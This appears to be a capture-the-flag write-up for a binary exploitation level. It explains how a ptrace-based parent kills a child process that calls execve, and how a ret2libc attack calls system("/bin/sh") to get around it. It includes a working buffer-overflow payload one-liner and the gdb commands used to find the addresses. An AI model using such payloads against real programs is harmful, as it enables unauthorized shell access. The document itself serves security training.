# LEVEL 04

## EXPLANATIONS

### BINARY BEHAVIOR

- Only a main function

  - forks, child does a `gets()` on a stack buffer.
    - => open door for a simple buffer overflow on sEIP of the child, as there is no stack canary

- Analyzing the binary, we found that this won't work :

  - ptrace(PTRACE_TRACEME) in the child makes it traced by the parent.
    - => sends SIGTRAP to parent when child does a system interrupt
      - SIGTRAP allows the parent to take control via a `wait`
  - the parent calls `wait` to listen to changes in the child status
    - a syscall is considered to be a change in status
  - the parent calls `ptrace(PTRACE_PEEKUSER, pid, 44);`

    - the return value of this call is the value of the childs `orig_eax` register, which store args sent to system calls.

      - if the returned value is 11 (syscall execve from the child), the parent kills the child.

    - We peek into the child process "user space" (structs below)
      - offset of 44 bytes in the user space gets us precisely to orig_eax.
      - => orig_eax is used to save the value inside eax at the moment of a syscall (as eax is then set with the syscall return value).

```
struct user
{
    struct user_regs_struct regs; // offset 0
    ...
};

struct user_regs_struct
{
    ...
    long int orig_eax; // offset 44
    ...
};
```

- Considering all this, we understand that a system call execve("/bin/sh") won't be possible here.

### EXPLOIT STRATEGY

- We need to launch the shell other than with a system interrupt execve.
- `system` function from libc is implemented using a fork.

  - => return to libc exploit, we call the system function from C stdlib.
  - No execve, no code 11 catched by the parent, no kill of the child.
    - => We bypass the security

- Classic call to a function is performed via the call instruction
  - (== push EIP + jmp func_addr)
- What we do is we use a ret instruction instead of a call

  - (== pop EIP + jmp EIP)
    - => stack state != normal function call

- If we want to mimic this "normal call state" we need to have, just before the call :
  - ESP : system@plt addr
    - will be popped from the stack and jumped to
  - ESP + 4 : random value (or exit to be more classy)
    - location of sEIP for system
  - ESP + 8 : arg1 of system call
    - => "/bin/sh" string addr

### RUN COMMAND

```
python -c 'print "A" * 156 +"\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]' > /tmp/exploit_string
cat /tmp/exploit_string - | ./level04
```

#### RESOURCES

- /usr/include/bits/waitstatus.h => MACRO WIF
- /usr/include/asm/unistd_32.h => Syscall EXECVE is value 11 (0xb) (+ ptrace values)
- /usr/include/sys/prctl.h => prctl(1, 1) == prctl(PR_SET_PDEATHSIG, SIGHUP)
- /usr/include/bits/signum.h
  -man ptrace / /usr/include/sys/ptrace.h

(gdb) find \_\_libc_start_main,+99999999,"/bin/sh"
0xf7f897ec

p system
system = 0xf7e6aed0

p exit
exit = 0xf7e5eb70
